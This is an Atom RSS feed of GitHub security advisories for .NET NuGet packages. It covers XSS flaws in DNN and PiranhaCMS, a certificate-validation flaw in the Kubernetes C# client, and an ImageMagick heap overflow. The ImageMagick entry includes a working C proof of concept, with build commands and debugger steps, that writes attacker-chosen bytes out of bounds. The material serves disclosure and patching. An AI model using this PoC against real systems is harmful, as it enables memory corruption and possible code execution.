<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/nuget.rss</id>
    <title>Security Advisory for .NET packages hosted at the NuGet Gallery</title>
    <updated>2025-09-29T02:28:16.902Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anuget"/>
    <subtitle>Security Advisory for .NET packages hosted at the NuGet Gallery on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[Piranha] PiranhaCMS stored XSS]]></title>
        <id>https://github.com/advisories/GHSA-456v-f425-8mcv</id>
        <link href="https://github.com/advisories/GHSA-456v-f425-8mcv"/>
        <updated>2025-09-26T21:39:55.000Z</updated>
        <content type="html"><![CDATA[<p>PiranhaCMS 12.0 allows stored XSS in the Text content block of Standard and Standard Archive Pages via /manager/pages, enabling execution of arbitrary JavaScript in another user s browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57692">https://nvd.nist.gov/vuln/detail/CVE-2025-57692</a></li>
<li><a href="https://github.com/PiranhaCMS/piranha.core/releases/tag/v12.0">https://github.com/PiranhaCMS/piranha.core/releases/tag/v12.0</a></li>
<li><a href="https://github.com/Saconyfx/security-advisories/blob/main/CVE-2025-57692/advisory.md">https://github.com/Saconyfx/security-advisories/blob/main/CVE-2025-57692/advisory.md</a></li>
<li><a href="https://github.com/advisories/GHSA-456v-f425-8mcv">https://github.com/advisories/GHSA-456v-f425-8mcv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-456v-f425-8mcv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-09-26T21:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[DotNetNuke.Core] DNN vulnerable to Reflected Cross-Site Scripting (XSS) using url to profile]]></title>
        <id>https://github.com/advisories/GHSA-jc4g-c8ww-5738</id>
        <link href="https://github.com/advisories/GHSA-jc4g-c8ww-5738"/>
        <updated>2025-09-23T19:13:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>A reflected cross-site scripting (XSS) vulnerability exists under certain conditions, using a specially crafter url to view a user profile</p>
<h1 id="description">Description</h1>
<p>DNN’s URL/path handling and template rendering can allow specially crafted input to be reflected into a user profile that are returned to the browser. In these cases, the application does not sufficiently neutralize or encode characters that are meaningful in HTML, so an attacker can cause a victim’s browser to interpret attacker-controlled content as part of the page’s HTML.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-jc4g-c8ww-5738">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-jc4g-c8ww-5738</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59821">https://nvd.nist.gov/vuln/detail/CVE-2025-59821</a></li>
<li><a href="https://github.com/advisories/GHSA-jc4g-c8ww-5738">https://github.com/advisories/GHSA-jc4g-c8ww-5738</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jc4g-c8ww-5738</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-09-23T15:09:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[DotNetNuke.Core] DNN Vulnerable to Stored XSS Using Backend Admin Credentials]]></title>
        <id>https://github.com/advisories/GHSA-gj8m-5492-q98h</id>
        <link href="https://github.com/advisories/GHSA-gj8m-5492-q98h"/>
        <updated>2025-09-23T19:13:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>Users that can edit modules could set a title that includes scripts.</p>
<h1 id="description">Description</h1>
<p>Some users (administrators and content editors) can set html in module titles and that could include javascript which could be used for XSS based attacks. With the addition of more roles being able to set module titles, this is not strictly limited to administrators. However since HTML in module titles could be a valid use case, we have added a setting for this functionality in the Security module in the Persona Bar.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-gj8m-5492-q98h">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-gj8m-5492-q98h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59546">https://nvd.nist.gov/vuln/detail/CVE-2025-59546</a></li>
<li><a href="https://github.com/advisories/GHSA-gj8m-5492-q98h">https://github.com/advisories/GHSA-gj8m-5492-q98h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj8m-5492-q98h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-23T15:09:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[DotNetNuke.Core] DNN Vulnerable to Stored Cross-Site Scripting (XSS) in the Prompt module]]></title>
        <id>https://github.com/advisories/GHSA-2qxc-mf4x-wr29</id>
        <link href="https://github.com/advisories/GHSA-2qxc-mf4x-wr29"/>
        <updated>2025-09-23T19:13:21.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The Prompt module allows execution of commands that can return raw HTML. Malicious input, even if sanitized for display elsewhere, can be executed when processed through certain commands, leading to potential script execution (XSS).</p>
<h1 id="description">Description</h1>
<p>The application sanitizes most user-submitted data before displaying it in entry forms. However, the Prompt module is capable of running commands whose output is treated as HTML. This creates a vulnerability where a malicious user can craft input containing embedded scripts or harmful markup.</p>
<p>If such malicious content is later processed by a Prompt command and returned as HTML, it bypasses the standard sanitation mechanisms. Simply executing a specific command through the Prompt module could render this untrusted data and cause unintended script execution in the browser specially in the context of a super-user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-2qxc-mf4x-wr29">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-2qxc-mf4x-wr29</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59545">https://nvd.nist.gov/vuln/detail/CVE-2025-59545</a></li>
<li><a href="https://github.com/advisories/GHSA-2qxc-mf4x-wr29">https://github.com/advisories/GHSA-2qxc-mf4x-wr29</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qxc-mf4x-wr29</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-09-23T15:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[DotNetNuke.Core] DNN affected by Stored Cross-Site Scripting (XSS) in Profile Biography field]]></title>
        <id>https://github.com/advisories/GHSA-7rcc-q6rq-jpcm</id>
        <link href="https://github.com/advisories/GHSA-7rcc-q6rq-jpcm"/>
        <updated>2025-09-23T19:13:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Users can use special syntax to inject javascript code in their profile biography field. Although there was sanitization in place, it did not cover all possible scenarios</p>
<h2 id="description">Description</h2>
<p>When embedding information in the <code>Biography</code> field, even if that field is not rich-text, users could inject javascript code that would run in the context of the website and to any other user that can view the profile including administrators and/or superusers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-7rcc-q6rq-jpcm">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-7rcc-q6rq-jpcm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59539">https://nvd.nist.gov/vuln/detail/CVE-2025-59539</a></li>
<li><a href="https://github.com/advisories/GHSA-7rcc-q6rq-jpcm">https://github.com/advisories/GHSA-7rcc-q6rq-jpcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rcc-q6rq-jpcm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-09-22T21:51:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[DotNetNuke.Core] DNN allows loading unused themes on anonymous clients through query parameters]]></title>
        <id>https://github.com/advisories/GHSA-wq2j-w9pm-7x2p</id>
        <link href="https://github.com/advisories/GHSA-wq2j-w9pm-7x2p"/>
        <updated>2025-09-22T22:00:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary themes can be loaded through query parameters. If an installed theme had a vulnerability, even if it was not used on any page, this could be loaded on unsuspecting clients without knowledge of the site owner.</p>
<h3 id="details">Details</h3>
<p>Many people who run DNN sites have a number of installed themes that they do not actually use. This could be because they were testing many themes during initial setup, because they have changed themes over time, or because they have development and production versions of a theme. Whatever the reason, many times the unused themes will become outdated over time as site admins wouldn't have reason to update something that is not used. However, this could introduce an entry point to exploit a vulnerable theme by making the server run the unused theme for unsuspecting client requests. Depending on the vulnerability in a theme, this could lead to server side or client side arbitrary code execution. With DNN 10.1.0 this functionality is now disabled by default but a setting was introduced in the Security module to turn activate the functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-wq2j-w9pm-7x2p">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-wq2j-w9pm-7x2p</a></li>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/commit/72f30f69fd2214d77f6c2577dfcca495a24caf5c">https://github.com/dnnsoftware/Dnn.Platform/commit/72f30f69fd2214d77f6c2577dfcca495a24caf5c</a></li>
<li><a href="https://dnncommunity.org/?SkinSrc=%5BG%5Dskins%2Fxcillion%2Fhome&amp;ContainerSrc=%5BG%5DContainers%2FXcillion%2FNoTitle">https://dnncommunity.org/?SkinSrc=%5BG%5Dskins%2Fxcillion%2Fhome&amp;ContainerSrc=%5BG%5DContainers%2FXcillion%2FNoTitle</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59535">https://nvd.nist.gov/vuln/detail/CVE-2025-59535</a></li>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/blob/develop/DNN%20Platform/Library/UI/Skins/Skin.cs#L305">https://github.com/dnnsoftware/Dnn.Platform/blob/develop/DNN%20Platform/Library/UI/Skins/Skin.cs#L305</a></li>
<li><a href="https://github.com/advisories/GHSA-wq2j-w9pm-7x2p">https://github.com/advisories/GHSA-wq2j-w9pm-7x2p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq2j-w9pm-7x2p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-09-22T21:10:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[KubernetesClient] Kubernetes C# client accepts certificates from any CA without properly verifying the trust chain]]></title>
        <id>https://github.com/advisories/GHSA-w7r3-mgwf-4mqq</id>
        <link href="https://github.com/advisories/GHSA-w7r3-mgwf-4mqq"/>
        <updated>2025-09-17T19:07:54.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the Kubernetes C# client where the certificate validation logic accepts properly constructed certificates from any Certificate Authority (CA) without properly verifying the trust chain. This flaw allows a malicious actor to present a forged certificate and potentially intercept or manipulate communication with the Kubernetes API server, leading to possible man-in-the-middle attacks and API impersonation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9708">https://nvd.nist.gov/vuln/detail/CVE-2025-9708</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/134063">https://github.com/kubernetes/kubernetes/issues/134063</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/rLopt2Msvbw/m/rK6XeNw2CgAJ">https://groups.google.com/g/kubernetes-security-announce/c/rLopt2Msvbw/m/rK6XeNw2CgAJ</a></li>
<li><a href="https://github.com/advisories/GHSA-w7r3-mgwf-4mqq">https://github.com/advisories/GHSA-w7r3-mgwf-4mqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7r3-mgwf-4mqq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-09-17T00:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-arm64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-OpenMP-arm64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
